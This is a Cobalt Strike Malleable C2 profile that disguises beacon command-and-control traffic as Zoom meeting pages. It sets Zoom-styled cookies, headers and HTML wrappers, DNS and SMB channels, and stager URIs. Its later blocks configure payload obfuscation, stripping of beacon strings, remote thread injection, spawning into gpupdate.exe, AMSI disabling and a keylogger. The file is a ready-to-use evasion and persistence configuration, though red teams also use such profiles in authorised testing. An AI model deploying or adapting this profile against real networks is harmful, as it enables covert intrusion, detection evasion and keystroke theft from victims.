#zoom profile
#xx0hcd

###Global Options###
set sample_name "zoom.profile";

set sleeptime "38500";
set jitter    "27";
set useragent "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C104";
set data_jitter "50";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "";
#    set password "";
#}

https-certificate {
    set C "US";
    set CN "whatever.com";
    set L "California";
    set O "whatever LLC.";
    set OU "local.org";
    set ST "CA";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";

    set block_useragents "curl*,lynx*,wget*";
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

###HTTP-GET Block###
http-get {

    set uri "/s/58462514417 /wc/58462514417";
    
    client {

        #header "Host" "";
        header "Connection" "close";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "navigate";
        header "Sec-Fetch-User" "?1";
        header "Sec-Detch-Dest" "document";

	   
    metadata {
        base64;

        prepend "zm_gnl_guid=";
        header "Cookie";

    }

    }

    server {
    
        header "Content-Type" "text/html;charset=utf-8";
        header "Connection" "close";
        header "Server" "ZOOM";
        header "X-Robots-Tag" "noindex, nofollow";
        header "X-Content-Type-Options" "nosniff";
 
        output {

            base64;
            
            prepend "<!DOCTYPE html>
<html xmlns:fb=\"http://ogp.me/ns/fb#\">
<head prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# zoomvideocall: http://ogp.me/ns/fb/zoomvideocall#\">
<meta charset=\"utf-8\">
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,Chrome=1\">
<meta name=\"viewport\" content=\"width=device-width,initial-scale=1,minimum-scale=1.0\">
<title>Launch Meeting - Zoom</title>
<meta name=\"keywords\" content=\"zoom, zoom.us, video conferencing, video conference, online meetings, web meeting, video meeting, cloud meeting, cloud video, group video call, group video chat, screen share, application share, mobility, mobile collaboration, desktop share, video collaboration, group messaging\">
<meta name=\"description\" content=\"Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems. Zoom Rooms is the original software-based conference room solution used around the world in board, conference, huddle, and training rooms, as well as executive offices and classrooms. Founded in 2011, Zoom helps businesses and organizations bring their teams together in a frictionless environment to get more done. Zoom is a publicly traded company headquartered in San Jose, CA.\">
<meta name=\"robots\" content=\"noindex,nofollow\">
<meta property=\"og:type\" content=\"activity\">
<meta property=\"og:title\" content=\"Join our Cloud HD Video Meeting\">
<meta property=\"og:description\" content=\"Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems. Zoom Rooms is the original software-based conference room solution used around the world in board, conference, huddle, and training rooms, as well as executive offices and classrooms. Founded in 2011, Zoom helps businesses and organizations bring their teams together in a frictionless environment to get more done. Zoom is a publicly traded company headquartered in San Jose, CA.\">
<meta property=\"og:url\" content=\"https://us04web.zoom.us/s/74263599745\">
<meta property=\"og:site_name\" content=\"Zoom Video\">
<meta property=\"fb:app_id\" content=\"113289095462482\">
<meta property=\"twitter:account_id\" content=\"522701657\">
<script src=\"/lres\"></script>
<link rel=\"shortcut icon\" href=\"/zoom.ico\">
</head>
<body>
<script>
window.launchBase64 = ";
            
            append "\"\n";
            append "(function () {
var js = (JSON.parse(\"{\"js\":[\"launch-meeting/meeting.ed15e165e6bc2c070974.js\"],\"css\":[]}\").js || [])[0];
if (js) {
var domains = window.zoomDomains[0];
loadJS(domains[0], js);
var next = domains[1];
next && setTimeout(function() { !document.getElementById('zoom-ui-frame') && loadJS(next, js); }, 5000);
}
function loadJS(domain, url) {
var el = document.createElement('script');
var src = domain + \"/fe-static/\" + url;
el.setAttribute(\"src\", src);
document.body.appendChild(el);
}
})();
</script>\n";
            append "  <script id=\"ze-snippet\" src=\"https://static.zdassets.com/ekr/snippet.js?key=f022518e-a528-43eb-b7d9-6af79e1de3db\"> </script>
</body>
</html>";      
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/meeting/save";
    #set verb "GET";
    set verb "POST";

    client {

	#header "Host" "";
	header "Connection" "close";
	#header "Accept" "*/*";
	header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "navigate";
        header "Sec-Detch-Dest" "document";
        
        output {
            base64url;
            prepend "zm_gnl_guid=";
	    header "Cookie";
        }

        id {
	    base64url;
            header "ZOOM-CSRFTOKEN";

        }
    }

    server {
    
        header "Content-Type" "text/html;charset=utf-8";
        header "Connection" "close";
        header "Server" "ZOOM";
        header "X-Robots-Tag" "noindex, nofollow";
        header "X-Content-Type-Options" "nosniff";

        output {
            netbios;	    
	   
	    prepend "    \"result\":\n";
	    prepend "    \"errorMessage\":null,\n";
	    prepend "    \"errorCode\":0,\n";
	    prepend "    \"status\":true,\n";
	    prepend "{\n";

	    append "}\n";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {

    set uri_x86 "/Signin";
    set uri_x64 "/signin";

    client {
        
        #header "Host" "";
        header "Connection" "close";
        header "Sec-Fetch-Site" "same-origin";
        header "Sec-Fetch-Mode" "navigate";
        header "Sec-Fetch-User" "?1";
        header "Sec-Detch-Dest" "document";
    }

    server {
        
        header "Content-Type" "text/html;charset=utf-8";
        header "Connection" "close";
        header "Server" "ZOOM";
        header "X-Robots-Tag" "noindex, nofollow";
        header "X-Content-Type-Options" "nosniff";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "12 Dec 2019 02:52:11";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        prepend "\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";

}
